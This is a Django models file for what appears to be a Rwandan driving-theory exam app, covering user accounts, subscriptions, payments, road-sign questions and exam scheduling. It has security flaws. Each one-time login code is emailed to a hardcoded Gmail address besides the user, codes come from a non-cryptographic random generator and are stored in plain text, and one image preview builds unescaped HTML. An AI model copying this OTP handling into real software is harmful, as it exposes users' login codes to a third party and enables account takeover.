# Install this with `pip install phonenumbers`
from django.core.mail import send_mail
from django.contrib.auth.tokens import default_token_generator

import random
from django.contrib.auth.models import AbstractUser, BaseUserManager

from django.core.exceptions import ValidationError
from django.db import models

from django.core.mail import send_mail
from datetime import date, timedelta
from django.conf import settings
import phonenumbers
from django.contrib import messages
from django.utils import timezone
from django.utils.html import format_html
from django.core.validators import FileExtensionValidator
import json  # Import the json module
from django.db.models import Count, F, ExpressionWrapper, FloatField,OuterRef,Subquery
from django.core.mail import send_mail, BadHeaderError
from smtplib import SMTPException  # <- correct source

from django.db.models.functions import Cast

class UserProfileManager(BaseUserManager):
    """Custom manager to allow login with either email or phone."""

    def create_user(self, email=None, phone_number=None, password=None, **extra_fields):
        if not email and not phone_number:
            raise ValueError("Either an email or phone number is required.")

        email = self.normalize_email(email) if email else None
        phone_number = phone_number if phone_number else None  # Ensure None, not ""

        user = self.model(email=email, phone_number=phone_number, **extra_fields)
        user.set_password(password)
        user.save(using=self._db)
        return user

    def create_superuser(self, email=None, phone_number=None, password=None, **extra_fields):
        extra_fields.setdefault("is_staff", True)
        extra_fields.setdefault("is_superuser", True)
        return self.create_user(email, phone_number, password, **extra_fields)


class UserProfile(AbstractUser):

    GENDER_CHOICES = [
        ('male','Gabo'),
        ('female', 'Gore')
    ]

    username = None  # Remove default username field
    name = models.CharField(max_length=25, unique=True)
    email = models.EmailField(unique=True, blank=True, null=True)
    phone_number = models.CharField(max_length=15,default=None, unique=True, null=True, blank=True)
    # gender = models.CharField(max_length=10, choices=GENDER_CHOICES, null=True, blank=True)
    profile_picture = models.ImageField(upload_to='images/', default='images/avatar.png',null=True, blank=True)
    date_joined = models.DateTimeField(auto_now_add=True)

    otp_code = models.CharField(max_length=6, blank=True, null=True)
    otp_verified = models.BooleanField(default=False)

    USERNAME_FIELD = 'phone_number'  # Default authentication field
    REQUIRED_FIELDS = ['email']  # Email is optional, but preferred
    whatsapp_number = models.CharField(max_length=20, blank=True, null=True)
    whatsapp_consent = models.BooleanField(default=False)
    whatsapp_notifications = models.BooleanField(default=False)
    objects = UserProfileManager()

    def save(self, *args, **kwargs):
        """Normalize phone number before saving to ensure consistency."""
        if self.phone_number:

            # if self.phone_number == '':
            #     self.phone_number = None
            # else:
            self.phone_number = self.normalize_phone_number(self.phone_number)
        super().save(*args, **kwargs)


    def clean(self):
        """Ensure phone number is in the correct format before saving."""
        if not self.email and not self.phone_number:
            raise ValidationError("Telefone cg Imeyili hitampo kimwe wuzuze neza.")

        if self.phone_number:
            self.phone_number = self.normalize_phone_number(self.phone_number)

            # Validate phone number format
            try:
                parsed_number = phonenumbers.parse(self.phone_number, "RW")
                if not phonenumbers.is_valid_number(parsed_number):
                    raise ValidationError("Telefone nyarwanda yujujwe nabi (+250).")
            except phonenumbers.NumberParseException:
                raise ValidationError("Telefone nyarwanda yujujwe nabi.")

        else:
            self.phone_number = None
    def normalize_phone_number(self, phone_number):
        """Ensures phone numbers are always stored in the format: +2507XXXXXXXX."""
        try:
            parsed_number = phonenumbers.parse(phone_number, "RW")
            return phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.E164)
        except phonenumbers.NumberParseException:
            return phone_number  # If invalid, return as-is

    @property
    def subscription_end_date(self):
        if hasattr(self, 'subscription'):
            return self.subscription.expires_at
        else:
            return 'Not Subscribed'

    @property
    def is_subscribed(self):
        if not hasattr(self, 'subscription'):
            return False
        return (
            self.subscription.expires_at and
            self.subscription.expires_at >= timezone.now() or
            self.subscription.active_subscription
        )


    @property
    def has_ended_subscription(self):
        if not hasattr(self, 'subscription'):
            return False
        return self.subscription.expires_at and self.subscription.expires_at < timezone.now()

    def send_otp_email(self):
        """Generates and sends an OTP via email."""
        if not self.email:
            return

        self.otp_code = str(random.randint(100000, 999999))
        self.save()

        try:
            send_mail(
                'OTP Code yawe',
                f"Koresha iyi code y'isuzuma👉 {self.otp_code}",
                settings.DEFAULT_FROM_EMAIL,
                [self.email, 'kigalids250@gmail.com'],
                fail_silently=False,
                )
        except (BadHeaderError, SMTPException) as e:
            raise ValidationError(
                f"Imeri '{self.email}' ntabwo yakiriye ubutumwa. Waba warayanditse nabi cyangwa ntiyabayeho?"
                )


    def verify_otp(self, otp):
        return self.otp_code == otp

    class Meta:
        verbose_name = "User"
        verbose_name_plural = "All Accounts"


    def __str__(self):
        return self.email if self.email else f"{self.name} - {self.phone_number}"


#instances should be first created
class Plan(models.Model):
    PLAN_CHOICES = (
        ('Daily', "Ry'umunsi"),
        ('Weekly', "Ry'icyumweru"),
        ('Monthly', "Ry'ukwezi"),
        # ('Super', "Super"),
        # ('Free', "Ubuntu"),
        # ('Trial', "Igihe gito"),
    )

    plan = models.CharField(max_length=20, choices=PLAN_CHOICES, unique=True)
    duration_days = models.IntegerField()
    price = models.IntegerField()
    delta_hours = models.IntegerField(default=0)
    delta_days = models.IntegerField(default=0)

    def get_delta(self):
        if self.delta_hours:
            return timezone.timedelta(hours=self.delta_hours)
        elif self.delta_days:
            return timezone.timedelta(days=self.delta_days)
        return None

    def clean(self):
        # Validation rules
        if not self.delta_hours and not self.delta_days:
            raise ValidationError("Either 'delta_hours' or 'delta_days' must be set.")

        if self.delta_hours < 0 or self.delta_days < 0:
            raise ValidationError("Delta values cannot be negative.")

        if self.duration_days <= 0:
            raise ValidationError("'duration_days' must be greater than zero.")

        if self.price <= 0:
            raise ValidationError("'price' must be greater than zero.")

    def __str__(self):
        return self.plan


class Subscription(models.Model):
    user = models.OneToOneField('UserProfile', on_delete=models.CASCADE)
    super_subscription = models.BooleanField(default=False)
    plan = models.ForeignKey('Plan', on_delete=models.SET_NULL, null=True, blank=True)
    price = models.IntegerField(null=True, blank=True)
    duration_days = models.IntegerField(default=0, null=True, blank=True)
    phone_number = models.CharField(max_length=13, default="25078")
    transaction_id = models.CharField(max_length=50, unique=True, blank=True, null=True)
    started_at = models.DateTimeField(auto_now_add=True)
    updated = models.BooleanField(default=False)
    updated_at = models.DateTimeField(auto_now=True)
    expires_at = models.DateTimeField(null=True, blank=True)

    def clean(self):
        if self.super_subscription and self.plan:
            raise ValidationError("Super subscription should not be linked with a plan.")
        
        if not self.super_subscription and not self.plan:
            raise ValidationError("Either super subscription must be enabled or a plan must be selected.")

        if self.super_subscription:
            if self.price or self.duration_days:
                raise ValidationError("Super subscription should not have price or duration.")
        
        if self.plan:
            if self.plan.duration_days <= 0 or self.plan.price <= 0:
                raise ValidationError("Plan must have a valid price and duration.")

    def save(self, *args, **kwargs):
        now = timezone.now()

        if self.super_subscription:
            # Super subscription — no expiry
            self.expires_at = None
            self.price = None
            self.duration_days = None
        elif self.plan:
            # Set based on the Plan settings
            self.duration_days = self.plan.duration_days
            self.price = self.plan.price
            delta = self.plan.get_delta()

            if delta:
                reference_time = self.updated_at if self.pk and self.updated else now
                self.expires_at = reference_time + delta

        super().save(*args, **kwargs)

    @property
    def active_subscription(self):
        """Check if the subscription is currently active."""
        if self.super_subscription:
            return True
        if self.expires_at and self.expires_at >= timezone.now():
            return True
        return False

    def __str__(self):
        return f"Subscription for {self.user}"

  
class Payment(models.Model):
    user = models.ForeignKey(UserProfile, on_delete=models.CASCADE)
    amount = models.DecimalField(max_digits=10, decimal_places=2)
    transaction_id = models.CharField(max_length=100, unique=True)
    status = models.CharField(max_length=50, choices=[('Success', 'Success'), ('Failed', 'Failed')])
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"{self.user.name} - {self.status}"

    class Meta:
        verbose_name = "User Payment"
        verbose_name_plural = "User Payments"

class SignType(models.Model):
    name = models.CharField(max_length=50)

    def __str__(self):
        return self.name

# models.py
class ImagePreviewMixin:
    def image_preview(self, field_name='image', height=100, width=150):
        image = getattr(self, field_name)
        if image:
            return format_html(
                '<img src="{}" style="max-height: {}px; max-width: {}px;" />',
                image.url,
                height,
                width
            )
        return "No Image"
    image_preview.allow_tags = True


class RoadSign(models.Model):
    sign_image = models.ImageField(
    upload_to='road_signs/',
    validators=[FileExtensionValidator(['jpg', 'png', 'jpeg'])]
    )
    definition = models.CharField(max_length=100, unique=True)
    type = models.ForeignKey(SignType, on_delete=models.SET_NULL, null=True, blank=True)
    uploaded_at = models.DateTimeField(auto_now_add=True)
    date_updated = models.DateTimeField(auto_now=True)
    is_active = models.BooleanField(default=True)


    def image_preview(self):
        """Generates HTML for image preview"""
        if self.sign_image:
            return format_html(
                f'<img src="{self.sign_image.url}" style="max-height: 100px; max-width: 150px;" />'
            )
        return "No Image"

    def __str__(self):
        return self.definition

    @property
    def image_url(self):
        """Returns full URL or None"""
        return self.sign_image.url if self.sign_image else None

class QuestionManager(models.Manager):
    def get_questions_with_index(self):
        return [(index + 1, question) for index, question in enumerate(self.all())]

class Question(models.Model):
    QUESTION_CHOICES = [(i, f"Choice {i}") for i in range(1, 5)]

    question_text = models.TextField(verbose_name="Question Text")
    question_type = models.ForeignKey('ExamType', on_delete=models.SET_NULL, null=True, verbose_name="Question Type")

    question_sign = models.ForeignKey(
        'RoadSign', related_name='questions', on_delete=models.SET_NULL, null=True, blank=True,
        verbose_name="Question Image"
    )

    # Choices as separate fields
    choice1_text = models.CharField(max_length=700, blank=True, verbose_name="Choice 1 Text")
    choice2_text = models.CharField(max_length=500, blank=True, verbose_name="Choice 2 Text")
    choice3_text = models.CharField(max_length=255, blank=True, verbose_name="Choice 3 Text")
    choice4_text = models.CharField(max_length=255, blank=True, verbose_name="Choice 4 Text")

    # Choices as related RoadSigns
    choice1_sign = models.ForeignKey(
        'RoadSign', blank=True, null=True, verbose_name="Choice 1 Sign",
        related_name="choice1_questions", on_delete=models.SET_NULL
    )
    choice2_sign = models.ForeignKey(
        'RoadSign', blank=True, null=True, verbose_name="Choice 2 Sign",
        related_name="choice2_questions", on_delete=models.SET_NULL
    )
    choice3_sign = models.ForeignKey(
        'RoadSign', blank=True, null=True, verbose_name="Choice 3 Sign",
        related_name="choice3_questions", on_delete=models.SET_NULL
    )
    choice4_sign = models.ForeignKey(
        'RoadSign', blank=True, null=True, verbose_name="Choice 4 Sign",
        related_name="choice4_questions", on_delete=models.SET_NULL
    )

    correct_choice = models.PositiveSmallIntegerField(
        choices=QUESTION_CHOICES, verbose_name="Correct Choice Number"
    )
    order = models.PositiveIntegerField(default=1, verbose_name="Display Order", unique=True)
    date_added = models.DateTimeField(auto_now_add=True)

    class Meta:
        ordering = ['order']
        verbose_name = "Question"
        verbose_name_plural = "Questions"

    def get_choices(self):
        choices = []
        for i in range(1, 5):
            text = getattr(self, f'choice{i}_text')
            sign = getattr(self, f'choice{i}_sign')

            if text:
                choices.append({
                    'id': i,  # Add the choice ID
                    'type': 'text',
                    'content': text,
                    'is_correct': i == self.correct_choice
                })
            elif sign:
                choices.append({
                    'id': i,  # Add the choice ID
                    'type': 'image',
                    'content': sign.image_url if sign else None,
                    'is_correct': i == self.correct_choice
                })
        return choices

    def __str__(self):
        return f"Q{self.order}: {self.question_text}... [type: {self.question_type.name if self.question_type else 'None'}]"

class ExamType(models.Model):
    name = models.CharField(max_length=500, default='Ibivanze')
    order = models.IntegerField(default=5)


    def __str__(self):
        return self.name

class Exam(models.Model):
    timezone = timezone.now().strftime('%d.%m.%Y %H')

    exam_type = models.ForeignKey(ExamType, on_delete=models.SET_NULL, null=True, blank=True )

    schedule_hour = models.TimeField(null=True, blank=True, help_text="Hour when the exam should be published")
    questions = models.ManyToManyField(Question, related_name='exams')
    duration = models.PositiveIntegerField(default=20,help_text="Duration of the exam in minutes")
    for_scheduling = models.BooleanField(default=True)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    is_active = models.BooleanField(default=False)


    class Meta:
        ordering = ['-created_at']
        verbose_name = "Exam"
        verbose_name_plural = "All Exams"



    @property
    def total_questions(self):
        return self.questions.count()

    @property
    def total_score(self):
        return self.total_questions

    # def remaining_attempts(self, user):
    #     attempts = UserExam.objects.filter(user=user, exam=self).count()
    #     return self.max_attempts - attempts

    def __str__(self):
        return f"{self.schedule_hour.strftime('%H:%M') if self.schedule_hour else 'No Hour'} / {self.updated_at.strftime('%d.%m.%Y')} - {self.exam_type.name if self.exam_type else 'None'}"

class ScheduledExam(models.Model):
    exam = models.OneToOneField("Exam", on_delete=models.CASCADE) # Ensure CASCADE to avoid null exams
    scheduled_datetime = models.DateTimeField(help_text="Date & time when the exam should be published")
    updated_datetime = models.DateTimeField(auto_now=True, help_text="Date & time when the exam should be published")
    # order

    @property
    def is_published(self):
        if not self.exam:
            return False

        return self.scheduled_datetime <= timezone.now()
    
    @property
    def is_live(self):
        """Check if the exam is live based on the scheduled time."""
        return timezone.now().hour == self.scheduled_datetime.hour and timezone.now().date() == self.scheduled_datetime.date()


    def save(self, *args, **kwargs):
        """Auto-publish if scheduled time has passed (Kigali time)"""
        now = timezone.localtime(timezone.now())
        scheduled_time = timezone.localtime(self.scheduled_datetime)

        if scheduled_time <= now:
            self.is_published
        super().save(*args, **kwargs)

    def __str__(self):
        return f"Scheduled: {self.exam.exam_type} at {self.scheduled_datetime}"

            # Notify all subscribed users
    def send_notification(self):
        """Send an email notification to all users when the exam goes live"""
        subject = f"New Exam is Live: {timezone.localtime(timezone.now())}"
        message = f"The exam of type '{self.exam.exam_type}' is now live! You can take it now."

        # Here, you would fetch the users who should receive the notification
        # Assuming you have a way to fetch them from the `UserProfile` model:
        users = UserProfile.objects.all()  # You can filter by specific users if needed
        for user in users:
            if user.email:  # Ensure the user has an email
                send_mail(
                    subject,
                    message,
                    'noreply@yourdomain.com',  # This can be your business email
                    [user.email],
                    fail_silently=False,
                )

            print(f"Exam '{self.exam.exam_type}' has been published and users have been notified! {subject}")

    def __str__(self):
        return f"Scheduled: {self.exam.exam_type} at {self.scheduled_datetime}"

class TodayExam(ScheduledExam):
    class Meta:
        proxy = True
        verbose_name = "Exam for Today"
        verbose_name_plural = "Exams Of Today"

class UnscheduledExam(Exam):
    class Meta:
        proxy = True
        verbose_name = "Exam By Type"
        verbose_name_plural = "Exams By Types"

class UserExamManager(models.Manager):
    def with_percent_score(self):

        total_questions_subquery = Exam.objects.filter(
            pk=OuterRef('exam_id')
        ).annotate(
            total=Count('questions')
        ).values('total')[:1]

        return self.get_queryset().annotate(
            total_questions=Subquery(total_questions_subquery),
            percent_score_db=ExpressionWrapper(
                F('score') * 100.0 / Cast(Subquery(total_questions_subquery), FloatField()),
                output_field=FloatField()
            )
        )

    def passed(self):
        return self.with_percent_score().filter(percent_score_db__gte=60)

    def failed(self):
        return self.with_percent_score().filter(percent_score_db__lt=60)

class UserExam(models.Model):
    user = models.ForeignKey('UserProfile', on_delete=models.CASCADE)
    exam = models.ForeignKey('Exam', on_delete=models.CASCADE)
    score = models.IntegerField(default=0)
    started_at = models.DateTimeField(auto_now_add=True)
    completed_at = models.DateTimeField(null=True, blank=True)

    objects = UserExamManager()

    class Meta:
        unique_together = ('user', 'exam')
        ordering = ['-completed_at']

    @property
    def percent_score(self):
        # Use DB-annotated value if available, otherwise fallback
        if hasattr(self, 'percent_score_db'):
            return self.percent_score_db
        if self.exam.total_questions > 0:
            return (self.score / self.exam.total_score) * 100
        return 0

    @property
    def is_passed(self):
        return 'Watsinze' if self.percent_score >= 60 else 'Watsinzwe'

    @property
    def time_taken(self):
        if self.completed_at:
            duration = int((self.completed_at - self.started_at).total_seconds() / 60)
            return duration if duration <= 20 else 'Ntiwasoje'
        return 'None'

    def save(self, *args, **kwargs):
        if not self.user.is_subscribed:
            raise ValidationError("Ntiwishyuye.")

        if self.completed_at and self.completed_at < timezone.now() - timedelta(hours=24):
            raise ValidationError("You cannot modify exams older than 24 hours.")

        super().save(*args, **kwargs)

    def __str__(self):
        return f"{self.user.username} - {self.exam.exam_type}"

class UserExamAnswer(models.Model):
    user_exam = models.ForeignKey(UserExam, on_delete=models.CASCADE)
    question = models.ForeignKey(Question, on_delete=models.CASCADE)
    selected_choice_number = models.PositiveSmallIntegerField(
        choices=Question.QUESTION_CHOICES, verbose_name="Selected Choice Number", null=True, blank=True
    )

    def __str__(self):
        return f"{self.user_exam.user.username} - {self.question.question_text[:50]} - Choice {self.selected_choice_number}"

class ContactMessage(models.Model):
    name = models.CharField(max_length=100)
    whatsapp_number = models.CharField(max_length=20, blank=True, null=True)
    email = models.EmailField()
    message = models.TextField()
    created_at = models.DateTimeField(auto_now_add=True)

    class Meta:
        verbose_name = "Message"
        verbose_name_plural = "User Messages"

    def __str__(self):
        return f"Message from {self.name} ({self.email})"

class UserActivity(models.Model):
    user = models.ForeignKey(UserProfile, on_delete=models.CASCADE)
    activity_type = models.CharField(max_length=255)
    details = models.TextField()
    timestamp = models.DateTimeField(default=timezone.now)

    def __str__(self):
        return f"{self.activity_type} by {self.user.username} on {self.timestamp}"

class Notification(models.Model):
    user = models.ForeignKey(UserProfile, on_delete=models.CASCADE)
    message = models.TextField()
    timestamp = models.DateTimeField(default=timezone.now)
    is_read = models.BooleanField(default=False)

    def __str__(self):
        return f"Notification for {self.user.username}"

    class Meta:
        verbose_name = "User Notification"
        verbose_name_plural = "User Notifications"

